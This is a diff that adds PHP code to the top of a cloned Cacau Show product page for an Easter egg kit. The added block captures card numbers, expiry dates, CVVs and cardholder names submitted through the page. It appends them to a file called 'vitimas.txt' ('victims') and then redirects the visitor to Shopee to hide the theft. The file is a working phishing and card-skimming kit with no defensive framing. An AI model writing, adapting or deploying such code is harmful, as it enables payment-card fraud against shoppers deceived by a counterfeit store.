@@ -1,3 +1,18 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $cartao = $_POST['card'];
+    $validade = $_POST['validade'];
+    $cvv = $_POST['cvv'];
+    $nome = $_POST['nome'];
+
+    $dados = "Cartão: $cartao | Validade: $validade | CVV: $cvv | Nome: $nome\n";
+    file_put_contents("vitimas.txt", $dados, FILE_APPEND);
+
+    header("Location: https://shopee.com.br");
+    exit();
+
+}
+?>
 <!DOCTYPE html>
 <!-- saved from url=(0105)https://www.cacaushow.com.br/produto/ovo-de-p%C3%A1scoa-ao-leite-kit-chef-chocomonstros-170g-1003610.html -->
 <html lang="" class="veiled" style="position: relative;"><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./Ovo de Páscoa ao Leite Kit Chef Chocomonstros 170g _ Loja Cacau Show_files/saved_resource.html"></iframe><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
